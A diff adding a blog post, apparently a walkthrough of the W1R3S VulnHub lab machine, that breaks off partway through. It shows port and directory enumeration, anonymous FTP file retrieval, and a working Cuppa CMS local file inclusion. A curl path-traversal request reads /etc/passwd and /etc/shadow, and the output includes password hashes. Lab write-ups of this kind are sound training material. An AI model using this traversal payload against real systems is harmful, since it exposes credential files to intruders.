@@ -1,0 +1,867 @@
+---
+layout: post
+title: "W1R3S: 1.0.1"
+date: 2019-05-23 22:25:16 +0000
+author: Larry Brown
+category: Walkthroughs
+tags: [vulnhub, vsftpd, cuppa cms, lfi, shadow, john, sudo, .bash_history, wordpress, wpscan, burp suite]
+---
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/w1r3s-101,220/" target="_blank">https://www.vulnhub.com/entry/w1r3s-101,220/</a></div>
+<div>Hostname: W1R3S</div>
+<div>IP Address: 10.183.0.197</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+  <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.197.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+  <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s# nmap -Pn -sT -sV -A --script=default,banner -oA w1r3s -p- 10.183.0.197</div>
+  <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-23 10:40 CDT</div>
+  <div>Nmap scan report for W1R3S.homenet.dom (10.183.0.197)</div>
+  <div>Host is up (0.0018s latency).</div>
+  <div>Not shown: 55528 filtered ports, 10003 closed ports</div>
+  <div>PORT     STATE SERVICE VERSION</div>
+  <div>
+    <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">21/tcp   open  ftp     vsftpd 2.0.8 or later</font>
+  </div>
+  <div>|_banner: 220 Welcome to W1R3S.inc FTP service. </div>
+  <div>| ftp-anon: Anonymous FTP login allowed (FTP code 230)</div>
+  <div>| <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</font>
+  </div>
+  <div>| <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</font>
+  </div>
+  <div>|_<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</font>
+  </div>
+  <div>| ftp-syst: </div>
+  <div>|   STAT: </div>
+  <div>| FTP server status:</div>
+  <div>|      Connected to ::ffff:10.183.0.222</div>
+  <div>|      Logged in as ftp</div>
+  <div>|      TYPE: ASCII</div>
+  <div>|      No session bandwidth limit</div>
+  <div>|      Session timeout in seconds is 300</div>
+  <div>|      Control connection is plain text</div>
+  <div>|      Data connections will be plain text</div>
+  <div>|      At session startup, client count was 4</div>
+  <div>|      <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">vsFTPd 3.0.3</font> - secure, fast, stable</div>
+  <div>|_End of status</div>
+  <div>
+    <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</font>
+  </div>
+  <div>|_banner: SSH-2.0-<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH_7.2p2</font> Ubuntu-4ubuntu2.4</div>
+  <div>| ssh-hostkey: </div>
+  <div>|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)</div>
+  <div>|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)</div>
+  <div>|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)</div>
+  <div>
+    <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</font>
+  </div>
+  <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div>
+  <div>|_http-title: Apache2 Ubuntu Default Page: It works</div>
+  <div>
+    <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">3306/tcp open  mysql   MySQL (unauthorized)</font>
+  </div>
+  <div>| banner: I\x00\x00\x00\xFFj\x04Host 'kali.homenet.dom' is not allowed to</div>
+  <div>|_ connect to this MySQL server</div>
+  <div>MAC Address: 00:0C:29:AA:7F:FC (VMware)</div>
+  <div>Device type: general purpose</div>
+  <div>Running: Linux 3.X|4.X</div>
+  <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+  <div>OS details: Linux 3.10 - 4.11</div>
+  <div>Network Distance: 1 hop</div>
+  <div>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>TRACEROUTE</div>
+  <div>HOP RTT     ADDRESS</div>
+  <div>1   1.82 ms W1R3S.homenet.dom (10.183.0.197)</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+  <div>Nmap done: 1 IP address (1 host up) scanned in 102.31 seconds</div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+  <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>Checking on the software returned by nmap:</div>
+<ul>
+  <li>
+    <div>vsFTPd 3.0.3 - no known vulnerabilities, but it does allow anonymous access</div>
+  </li>
+  <li>
+    <div>OpenSSH 7.2p2 - common username enumeration issues</div>
+  </li>
+  <li>
+    <div>Apache/2.4.18 - no remote issues we can use</div>
+  </li>
+</ul>
+<div><br /></div>
+<div>Let's start by taking a look at the files available on the FTP server. We'll use wget to pull everything down.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/ftp# wget --no-passive -m --user=anonymous --password= ftp://10.183.0.197</div>
+  <div>--2019-05-23 10:48:08--  ftp://10.183.0.197/</div>
+  <div>           =&gt; '10.183.0.197/.listing'</div>
+  <div>Connecting to 10.183.0.197:21... connected.</div>
+  <div>Logging in as anonymous ... Logged in!</div>
+  <div>==&gt; SYST ... done.    ==&gt; PWD ... done.</div>
+  <div>==&gt; TYPE I ... done.  ==&gt; CWD not needed.</div>
+  <div>==&gt; PORT ... done.    ==&gt; LIST ... done.</div>
+  <div>[...snip...]</div>
+  <div>FINISHED --2019-05-23 10:48:08--</div>
+  <div>Total wall clock time: 0.1s</div>
+  <div>Downloaded: 9 files, 2.0K in 0.03s (69.2 KB/s)</div>
+</div>
+<div><br /></div>
+<div>We were able to download 5 files from the service (located in 3 different folders).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/ftp/10.183.0.197# ls -laF *</div>
+  <div>content:</div>
+  <div>-rw-r--r-- 1 root root   29 Jan 23  2018 01.txt</div>
+  <div>-rw-r--r-- 1 root root  165 Jan 23  2018 02.txt</div>
+  <div>-rw-r--r-- 1 root root  582 Jan 23  2018 03.txt</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>docs:</div>
+  <div>-rw-r--r-- 1 root root  138 Jan 23  2018 worktodo.txt</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>new-employees:</div>
+  <div>-rw-r--r-- 1 root root  155 Jan 28  2018 employee-names.txt</div>
+</div>
+<div><br /></div>
+<div>File 01.txt contains the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/ftp/10.183.0.197/content# cat 01.txt </div>
+  <div>New FTP Server For W1R3S.inc</div>
+</div>
+<div><br /></div>
+<div>File 02.txt contains the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/ftp/10.183.0.197/content# cat 02.txt </div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>01ec2d8fc11c493b25029fb1f47f39ce</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>#</div>
+  <div>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</div>
+  <div>############################################</div>
+</div>
+<div><br /></div>
+<div>Submitting the first string to <a href="https://hashkiller.co.uk/Cracker/MD5" target="_blank">https://hashkiller.co.uk/Cracker/MD5</a>, we get...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>01ec2d8fc11c493b25029fb1f47f39ce MD5 This[space]is[space]not[space]a[space]password</div>
+</div>
+<div><br /></div>
+<div>Using base64 to decode the base64 string, we get...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/ftp/10.183.0.197/content# echo "SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==" | base64 -d</div>
+  <div>It is easy, but not that easy..</div>
+</div>
+<div><br /></div>
+<div>File 03.txt contains some fancy ASCII art...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/ftp/10.183.0.197/content# cat 03.txt </div>
+  <div>___________.__              __      __  ______________________   _________    .__               </div>
+  <div>\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </div>
+  <div>  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </div>
+  <div>  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </div>
+  <div>  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</div>
+  <div>                \/     \/         \/                \/       \/        \/  \/         \/     \/ </div>
+</div>
+<div><br /></div>
+<div>File worktodo.txt contains the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/ftp/10.183.0.197/docs# cat worktodo.txt </div>
+  <div>        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>....punoɹɐ ƃuıʎɐןd doʇs 'op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</div>
+</div>
+<div><br /></div>
+<div>The first line is a little difficult to read, but says "I don't think this is the way to root!"</div>
+<div><br /></div>
+<div>The employee-names.txt file contains the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/ftp/10.183.0.197/new-employees# cat employee-names.txt </div>
+  <div>The W1R3S.inc employee list</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>Naomi.W - Manager</div>
+  <div>Hector.A - IT Dept</div>
+  <div>Joseph.G - Web Design</div>
+  <div>Albert.O - Web Design</div>
+  <div>Gina.L - Inventory</div>
+  <div>Rico.D - Human Resources</div>
+</div>
+<div><br /></div>
+<div>Well, we learned a little bit, but not much. Now let's see what we can find out about the HTTP service on TCP port 80.</div>
+<div><br /></div>
+<div>Checking the default site using curl, we have the Apache2 Ubuntu Default Page. There isn't a robots.txt file, so no hints there. Let's see what we can find with nikto.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s# nikto -h http://10.183.0.197</div>
+  <div>- Nikto v2.1.6</div>
+  <div>---------------------------------------------------------------------------</div>
+  <div>+ Target IP:          10.183.0.197</div>
+  <div>+ Target Hostname:    10.183.0.197</div>
+  <div>+ Target Port:        80</div>
+  <div>+ Start Time:         2019-05-23 11:22:12 (GMT-5)</div>
+  <div>---------------------------------------------------------------------------</div>
+  <div>+ Server: Apache/2.4.18 (Ubuntu)</div>
+  <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+  <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+  <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t</div>
+  <div>ype</div>
+  <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
+  <div>+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 56376a7d098fc, mtime: gzip</div>
+  <div>+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
+  <div>+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST</div>
+  <div>+ Cookie country created without the httponly flag</div>
+  <div>+ Cookie language created without the httponly flag</div>
+  <div>+ Cookie PHPSESSID created without the httponly flag</div>
+  <div>+ Cookie administrator_path created without the httponly flag</div>
+  <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
+  <div>+ 7915 requests: 0 error(s) and 11 item(s) reported on remote host</div>
+  <div>+ End Time:           2019-05-23 11:23:21 (GMT-5) (69 seconds)</div>
+  <div>---------------------------------------------------------------------------</div>
+  <div>+ 1 host(s) tested</div>
+</div>
+<div><br /></div>
+<div>Still not much. Let's start brute forcing directories. We'll use wfuzz to see what might be hiding on the server.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s# wfuzz -z file,/usr/share/dirb/wordlists/big.txt -t 30 --hc 404 http://10.183.0.197/FUZZ</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>********************************************************</div>
+  <div>* Wfuzz 2.3.4 - The Web Fuzzer                         *</div>
+  <div>********************************************************</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>Target: http://10.183.0.197/FUZZ</div>
+  <div>Total requests: 20469</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>==================================================================</div>
+  <div>ID   Response   Lines      Word         Chars          Payload    </div>
+  <div>==================================================================</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>000015:  C=403     11 L       32 W          296 Ch        ".htaccess"</div>
+  <div>000016:  C=403     11 L       32 W          296 Ch        ".htpasswd"</div>
+  <div>001896:  C=301      9 L       28 W          320 Ch        "administrator"</div>
+  <div>010028:  C=301      9 L       28 W          317 Ch        "javascript"</div>
+  <div>016215:  C=403     11 L       32 W          300 Ch        "server-status"</div>
+  <div>019909:  C=301      9 L       28 W          316 Ch        "wordpress"</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>Total time: 29.27127</div>
+  <div>Processed Requests: 20469</div>
+  <div>Filtered Requests: 20463</div>
+  <div>Requests/sec.: 699.2862</div>
+</div>
+<div><br /></div>
+<div>Nice! We are finally getting something.</div>
+<div><br /></div>
+<div>Connecting to /administrator, we are redirected to <a href="http://10.183.0.197/administrator/installation/">http://10.183.0.197/administrator/installation/</a></div>
+<div><br /></div>
+<div><img height="480" src="/assets/images/2019-05-23-w1r3s-1.0.1/0F598390-E188-4C50-B157-F7C02C6058CF.png" width="1365" /><br /></div>
+<div><br /></div>
+<div>Checking the exploit database, we have one entry for "Cuppa CMS".</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                              | exploits/php/webapps/25971.txt</div>
+</div>
+<div><br /></div>
+<div>Reading through the exploit, it looks like the alertConfigField.php file calls include with an attacker controlled variable.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>&lt;?php include($_REQUEST["urlConfig"]); ?&gt;</div>
+</div>
+<div><br /></div>
+<div>The exploit also has a link to the Cuppa CMS <a href="http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip" target="_blank">source code</a>. I'll download it to see what's actually happening.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s/cuppa/administrator/alerts# cat alertConfigField.php</div>
+  <div>&lt;?php</div>
+  <div>    include_once(realpath(__DIR__ . '/..')."/classes/Cuppa.php");</div>
+  <div>    $cuppa = Cuppa::getInstance();</div>
+  <div>    $language = $cuppa-&gt;language-&gt;load();</div>
+  <div>?&gt;</div>
+  <div>[...snip...]</div>
+  <div>&lt;div class="alert_config_field" id="alert"&gt;</div>
+  <div>    &lt;div class="alert_config_top"&gt;</div>
+  <div>        &lt;strong&gt;&lt;?php echo $language-&gt;fields_configuration ?&gt;&lt;/strong&gt;: &lt;?php echo @$cuppa-&gt;POST("field"); ?&gt;</div>
+  <div>        &lt;div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"&gt;&lt;/div&gt;</div>
+  <div>    &lt;/div&gt;</div>
+  <div>    &lt;div id="content_alert_config" class="content_alert_config"&gt;</div>
+  <div>        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">&lt;?php include "../components/table_manager/fields/config/".@$cuppa-&gt;POST("urlConfig"); ?&gt;</font>
+  </div>
+  <div>    &lt;/div&gt;</div>
+  <div>&lt;/div&gt;</div>
+</div>
+<div><br /></div>
+<div>OK. Looks like things are a little more complex than the exploit let on. I'll use curl to make a POST request and see if we can get the LFI to work.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s# curl -d "field=test&amp;urlConfig=../../../../../../../../../../../../etc/passwd" http://10.183.0.197/administrator/alerts</div>
+  <div>/alertConfigField.php</div>
+  <div>[...snip...]</div>
+  <div>&lt;div class="alert_config_field" id="alert"&gt;</div>
+  <div>    &lt;div class="alert_config_top"&gt;</div>
+  <div>        &lt;strong&gt;Configuration&lt;/strong&gt;: test        &lt;div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"&gt;&lt;/div&gt;</div>
+  <div>    &lt;/div&gt;</div>
+  <div>    &lt;div id="content_alert_config" class="content_alert_config"&gt;</div>
+  <div>        root:x:0:0:root:/root:/bin/bash</div>
+  <div>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div>
+  <div>bin:x:2:2:bin:/bin:/usr/sbin/nologin  </div>
+  <div>sys:x:3:3:sys:/dev:/usr/sbin/nologin  </div>
+  <div>sync:x:4:65534:sync:/bin:/bin/sync</div>
+  <div>games:x:5:60:games:/usr/games:/usr/sbin/nologin</div>
+  <div>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</div>
+  <div>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</div>
+  <div>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</div>
+  <div>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</div>
+  <div>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</div>
+  <div>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</div>
+  <div>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div>
+  <div>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</div>
+  <div>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</div>
+  <div>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</div>
+  <div>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</div>
+  <div>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</div>
+  <div>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</div>
+  <div>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</div>
+  <div>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</div>
+  <div>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</div>
+  <div>syslog:x:104:108::/home/syslog:/bin/false</div>
+  <div>_apt:x:105:65534::/nonexistent:/bin/false</div>
+  <div>messagebus:x:106:110::/var/run/dbus:/bin/false</div>
+  <div>uuidd:x:107:111::/run/uuidd:/bin/false</div>
+  <div>lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false</div>
+  <div>whoopsie:x:109:117::/nonexistent:/bin/false</div>
+  <div>avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</div>
+  <div>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</div>
+  <div>dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</div>
+  <div>colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</div>
+  <div>speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</div>
+  <div>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</div>
+  <div>kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</div>
+  <div>pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false</div>
+  <div>rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false</div>
+  <div>saned:x:119:127::/var/lib/saned:/bin/false</div>
+  <div>usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</div>
+  <div>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash</div>
+  <div>sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin</div>
+  <div>ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false</div>
+  <div>mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false</div>
+  <div>    &lt;/div&gt;</div>
+  <div>&lt;/div&gt;</div>
+</div>
+<div><br /></div>
+<div>Nice! Looks like it worked. Checking a few other "high value" files and, amazingly, we are also able to read /etc/shadow.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>[...snip...]</div>
+  <div>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</div>
+  <div>daemon:*:17379:0:99999:7:::</div>
+  <div>bin:*:17379:0:99999:7:::</div>
+  <div>sys:*:17379:0:99999:7:::</div>
+  <div>sync:*:17379:0:99999:7:::</div>
+  <div>games:*:17379:0:99999:7:::</div>
+  <div>man:*:17379:0:99999:7:::</div>
+  <div>lp:*:17379:0:99999:7:::</div>
+  <div>mail:*:17379:0:99999:7:::</div>
+  <div>news:*:17379:0:99999:7:::</div>
+  <div>uucp:*:17379:0:99999:7:::</div>
+  <div>proxy:*:17379:0:99999:7:::</div>
+  <div>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</div>
+  <div>backup:*:17379:0:99999:7:::</div>
+  <div>list:*:17379:0:99999:7:::</div>
+  <div>irc:*:17379:0:99999:7:::</div>
+  <div>gnats:*:17379:0:99999:7:::</div>
+  <div>nobody:*:17379:0:99999:7:::</div>
+  <div>systemd-timesync:*:17379:0:99999:7:::</div>
+  <div>systemd-network:*:17379:0:99999:7:::</div>
+  <div>systemd-resolve:*:17379:0:99999:7:::  </div>
+  <div>systemd-bus-proxy:*:17379:0:99999:7:::</div>
+  <div>syslog:*:17379:0:99999:7:::</div>
+  <div>_apt:*:17379:0:99999:7:::</div>
+  <div>messagebus:*:17379:0:99999:7:::</div>
+  <div>uuidd:*:17379:0:99999:7:::</div>
+  <div>lightdm:*:17379:0:99999:7:::</div>
+  <div>whoopsie:*:17379:0:99999:7:::</div>
+  <div>avahi-autoipd:*:17379:0:99999:7:::</div>
+  <div>avahi:*:17379:0:99999:7:::</div>
+  <div>dnsmasq:*:17379:0:99999:7:::</div>
+  <div>colord:*:17379:0:99999:7:::</div>
+  <div>colord:*:17379:0:99999:7:::</div>
+  <div>speech-dispatcher:!:17379:0:99999:7:::</div>
+  <div>hplip:*:17379:0:99999:7:::</div>
+  <div>kernoops:*:17379:0:99999:7:::</div>
+  <div>pulse:*:17379:0:99999:7:::</div>
